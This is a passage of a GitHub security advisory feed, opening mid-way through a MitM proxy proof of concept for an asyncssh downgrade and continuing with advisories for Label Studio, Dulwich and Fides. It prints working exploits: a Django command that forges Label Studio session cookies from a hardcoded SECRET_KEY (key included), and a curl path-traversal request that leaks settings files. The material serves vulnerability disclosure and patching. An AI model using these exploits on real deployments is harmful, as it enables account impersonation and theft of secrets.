     mitm_socket.bind((PROXY_IP, PROXY_PORT))
     mitm_socket.listen(5)
 
     print(f"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...")
 
     try:
         while True:
             client_socket, client_addr = mitm_socket.accept()
             print(f"[+] Accepted connection from: {client_addr}")
             print(f"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.")
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.connect((SERVER_IP, SERVER_PORT))
             print("[+] Spawning new forwarding threads to handle client connection.")
             Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()
             Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()
     except KeyboardInterrupt:
         client_socket.close()
         server_socket.close()
         mitm_socket.close()
</code></pre>
</details>

<h3 id="impact">Impact</h3>
<p>Algorithm downgrade during user authentication.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ronf/asyncssh/security/advisories/GHSA-cfc2-wr2v-gxm5">https://github.com/ronf/asyncssh/security/advisories/GHSA-cfc2-wr2v-gxm5</a></li>
<li><a href="https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e">https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46445">https://nvd.nist.gov/vuln/detail/CVE-2023-46445</a></li>
<li><a href="https://github.com/advisories/GHSA-cfc2-wr2v-gxm5">https://github.com/advisories/GHSA-cfc2-wr2v-gxm5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfc2-wr2v-gxm5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-09T18:34:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Label Studio has Hardcoded Django `SECRET_KEY` that can be Abused to Forge Session Tokens]]></title>
        <id>https://github.com/advisories/GHSA-f475-x83m-rx5m</id>
        <link href="https://github.com/advisories/GHSA-f475-x83m-rx5m"/>
        <updated>2023-11-09T16:46:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This write-up describes a vulnerability found in <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, a popular open source data labeling tool. The vulnerability was found to affect versions before <code>1.8.2</code>, where a patch was introduced.</p>
<h1 id="overview">Overview</h1>
<p>In <a href="https://github.com/HumanSignal/label-studio/tree/1.8.1">Label Studio version 1.8.1</a>, a hard coded Django <code>SECRET_KEY</code> was set in the application settings. The Django <code>SECRET_KEY</code> is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.</p>
<p>However, the Django framework inserts a <code>_auth_user_hash</code> claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) and forge session tokens for all users on Label Studio using the hard coded <code>SECRET_KEY</code>.</p>
<h1 id="description">Description</h1>
<p>Below is the code snippet of the Django settings file at <a href="https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108"><code>label_studio/core/settings/base.py</code></a>.</p>
<pre><code class="language-python"># SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'
</code></pre>
<p>This secret is hard coded across all instances of Label Studio.</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Below are the steps that an attacker could do to forge a session token of any account on Label Studio:</p>
<ol>
<li><p>Exploit the ORM Leak vulnerability (patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email <code>ghostccamm@testvm.local</code> with the password hash <code>pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=</code> that was retrieved.</p>
</li>
<li><p>Create a new Django project with an empty application. In <code>cookieforge/cookieforge/settings.py</code> set the <code>SECRET_KEY</code> to <code>$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n</code>. Create a management command with the following code that will be used to create forged session tokens.</p>
</li>
</ol>
<pre><code class="language-python">from typing import Any
from django.core.management.base import  BaseCommand, CommandParser
from django.core import signing
from django.utils.crypto import salted_hmac
from django.conf import settings
import time, uuid

class Command(BaseCommand):
    help = "Forge a users session cookie on Label Studio"

    def add_arguments(self, parser: CommandParser) -&gt; None:
        parser.add_argument(
            '-o', '--organisation',
            help='Organisation ID to access',
            default=1,
            type=int
        )

        parser.add_argument(
            'user_id',
            help='The User ID of the victim you want to impersonate',
            type=str
        )

        parser.add_argument(
            'user_hash',
            help='The password hash the user you want to impersonate'
        )

    def handle(self, *args: Any, **options: Any) -&gt; str | None:
        key = settings.SECRET_KEY
        # Creates the _auth_user_hash HMAC of the victim's password hash
        auth_user_hash = salted_hmac(
            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',
            options['user_hash'],
            secret=key,
            algorithm="sha256"
        ).hexdigest()

        session_dict = {
            'uid': str(uuid.uuid4()), 
            'organization_pk': options['organisation'], 
            'next_page': '/projects/', 
            'last_login': time.time(), 
            '_auth_user_id': options['user_id'], 
            '_auth_user_backend': 
            'django.contrib.auth.backends.ModelBackend', 
            '_auth_user_hash': auth_user_hash, 
            'keep_me_logged_in': True, 
            '_session_expiry': 600
        }

        # Creates a forged session token
        session_token = signing.dumps(
            session_dict,
            key=key,
            salt="django.contrib.sessions.backends.signed_cookies",
            compress=True
        )

        self.stdout.write(
            self.style.SUCCESS(f"session token: {session_token}")
        )
</code></pre>
<ol start="3">
<li>Next run the following command replacing the <code>{user_id}</code> with the user ID of the account you want to the impersonate and <code>{user_hash}</code> with the victim's password hash. Copy the session token that is printed.</li>
</ol>
<pre><code class="language-python">python3 manage.py forgecookie {user_id} '{user_hash}'
</code></pre>
<ol start="4">
<li>Change the <code>sessionid</code> cookie on the browser and refresh the page. Observe being authenticated as the victim user.</li>
</ol>
<h1 id="impact">Impact</h1>
<p>This vulnerability can be chained with the ORM Leak vulnerability (which was patched in <a href="https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0"><code>1.9.2post0</code></a>) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.</p>
<h1 id="remediation-advice">Remediation Advice</h1>
<p>It is important to note that the hard coded <code>SECRET_KEY</code> has already been removed in Label Studio versions <code>&gt;=1.8.2</code>. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.</p>
<p>We recommend that Human Signal to release a public disclosure about the hard coded <code>SECRET_KEY</code> to encourage users to patch to a version <code>&gt;=1.8.2</code> to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.</p>
<h1 id="discovered">Discovered</h1>
<ul>
<li>August 2023, Robert Schuh, @robbilie</li>
<li>August 2023, Alex Brown, elttam</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/pull/4690">https://github.com/HumanSignal/label-studio/pull/4690</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b">https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/releases/tag/1.8.2">https://github.com/HumanSignal/label-studio/releases/tag/1.8.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43791">https://nvd.nist.gov/vuln/detail/CVE-2023-43791</a></li>
<li><a href="https://github.com/advisories/GHSA-f475-x83m-rx5m">https://github.com/advisories/GHSA-f475-x83m-rx5m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f475-x83m-rx5m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-09T14:42:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dulwich] Dulwich RCE Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cwwh-4382-6fwr</id>
        <link href="https://github.com/advisories/GHSA-cwwh-4382-6fwr"/>
        <updated>2023-11-09T05:04:06.000Z</updated>
        <content type="html"><![CDATA[<p>Dulwich before 0.18.5, when an SSH subprocess is used, allows remote attackers to execute arbitrary commands via an ssh URL with an initial dash character in the hostname, a related issue to CVE-2017-9800, CVE-2017-12836, CVE-2017-12976, CVE-2017-1000116, and CVE-2017-1000117.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-16228">https://nvd.nist.gov/vuln/detail/CVE-2017-16228</a></li>
<li><a href="https://tracker.debian.org/news/882440">https://tracker.debian.org/news/882440</a></li>
<li><a href="https://github.com/jelmer/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6">https://github.com/jelmer/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6</a></li>
<li><a href="https://web.archive.org/web/20201220231743/https://www.dulwich.io/code/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6/">https://web.archive.org/web/20201220231743/https://www.dulwich.io/code/dulwich/commit/7116a0cbbda571f7dac863f4b1c00b6e16d6d8d6/</a></li>
<li><a href="https://web.archive.org/web/20210128154006/https://www.dulwich.io/code/dulwich/">https://web.archive.org/web/20210128154006/https://www.dulwich.io/code/dulwich/</a></li>
<li><a href="https://github.com/advisories/GHSA-cwwh-4382-6fwr">https://github.com/advisories/GHSA-cwwh-4382-6fwr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cwwh-4382-6fwr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-13T01:44:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Nginx alias path traversal allows unauthenticated attackers to read all files on /label_studio/core/]]></title>
        <id>https://github.com/advisories/GHSA-cpmr-mw4j-99r7</id>
        <link href="https://github.com/advisories/GHSA-cpmr-mw4j-99r7"/>
        <updated>2023-11-08T22:39:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The vulnerability resides on the Nginx config file:
<a href="https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119">https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119</a></p>
<p>The pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash <code>/</code> at the end, the following code shows an example of a safe configuration:</p>
<pre><code class="language-nginx">location /static/ {
[...]
</code></pre>
<p>The vulnerability works because Nginx will think that <code>/static../</code> is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.</p>
<p>Of course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.
This is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)</p>
<p>** Proof-of-Concept (Leaking Secret Keys): **
Exploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.</p>
<pre><code class="language-bash"># Production Label Studio docker-compose running on localhost:8080
/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py
"""This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.
"""
import os
import pathlib

from core.settings.base import *

DJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)
DATABASES = {'default': DATABASES_ALL[DJANGO_DB]}

MIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')
MIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')
if INACTIVITY_SESSION_TIMEOUT_ENABLED:
    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')

ADD_DEFAULT_ML_BACKENDS = False

LOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')

DEBUG = get_bool_env('DEBUG', False)

DEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)

SESSION_COOKIE_SECURE = False

SESSION_ENGINE = "django.contrib.sessions.backends.signed_cookies"

RQ_QUEUES = {}

SENTRY_DSN = get_env(
    'SENTRY_DSN',
    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'
)
SENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')

FRONTEND_SENTRY_DSN = get_env(
    'FRONTEND_SENTRY_DSN',
    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')
FRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')

EDITOR_KEYMAP = json.dumps(get_env("EDITOR_KEYMAP"))

from label_studio import __version__
from label_studio.core.utils import sentry
sentry.init_sentry(release_name='label-studio', release_version=__version__)

# we should do it after sentry init
from label_studio.core.utils.common import collect_versions
versions = collect_versions()

# in Label Studio Community version, feature flags are always ON
FEATURE_FLAGS_DEFAULT_VALUE = True
# or if file is not set, default is using offline mode
FEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)

from core.utils.io import find_file
FEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')
FEATURE_FLAGS_FROM_FILE = True
try:
    from core.utils.io import find_node
    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')
except IOError:
    FEATURE_FLAGS_FROM_FILE = False

STORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)
</code></pre>
<h3 id="impact">Impact</h3>
<p>The impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7">https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7</a></li>
<li><a href="https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119">https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/60a3ef57a22c50d7230a56c11d85e14454c99a28">https://github.com/HumanSignal/label-studio/commit/60a3ef57a22c50d7230a56c11d85e14454c99a28</a></li>
<li><a href="https://github.com/advisories/GHSA-cpmr-mw4j-99r7">https://github.com/advisories/GHSA-cpmr-mw4j-99r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cpmr-mw4j-99r7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-24T22:04:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ethyca-fides] Ethyca Fides HTML Injection Vulnerability in HTML-Formatted DSR Packages]]></title>
        <id>https://github.com/advisories/GHSA-3vpf-mcj7-5h38</id>
        <link href="https://github.com/advisories/GHSA-3vpf-mcj7-5h38"/>
        <updated>2023-11-09T16:14:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Fides web application allows data subject users to request access to their personal data. If the request is approved by the data controller user operating the Fides web application, the data subject's personal data can then retrieved from connected systems and data stores before being bundled together as a data subject access request package for the data subject to download. Supported data formats for the package include json and csv, but the most commonly used format is a series of HTML files compressed in a ZIP file. Once downloaded and unzipped, the data subject user can browse the HTML files on their local machine.</p>
<p>It was identified that there was no validation of input coming from e.g. the connected systems and data stores which is later reflected in the downloaded data. This can result in an HTML injection that can be abused e.g. for phishing attacks or malicious JavaScript code execution, but only in the context of the data subject's browser accessing a HTML page using the <code>file://</code> protocol.</p>
<p>Exploitation is limited to rogue Admin UI users, malicious connected system / data store users, and the data subject user if tricked via social engineering into submitting malicious data themselves.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in Fides version <code>TBC</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Only Fides deployments which have been configured to use <code>html</code> as the package format in the <a href="https://docs.ethyca.com/dev-docs/configuration/privacy-requests/storage-destinations">storage destination</a> are vulnerable. Using <code>json</code> or <code>csv</code> instead eliminates this vulnerability. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ethyca/fides/security/advisories/GHSA-3vpf-mcj7-5h38">https://github.com/ethyca/fides/security/advisories/GHSA-3vpf-mcj7-5h38</a></li>
<li><a href="https://github.com/ethyca/fides/commit/50360a0e24aac858459806bb140bb1c4b71e67a1">https://github.com/ethyca/fides/commit/50360a0e24aac858459806bb140bb1c4b71e67a1</a></li>
<li><a href="https://github.com/ethyca/fides/releases/tag/2.23.3">https://github.com/ethyca/fides/releases/tag/2.23.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47114">https://nvd.nist.gov/vuln/detail/CVE-2023-47114</a></li>
<li><a href="https://github.com/advisories/GHSA-3vpf-mcj7-5h38">https://github.com/advisories/GHSA-3vpf-mcj7-5h38</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3vpf-mcj7-5h38</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-08T17:52:28.000Z</published>
    </entry>
</feed>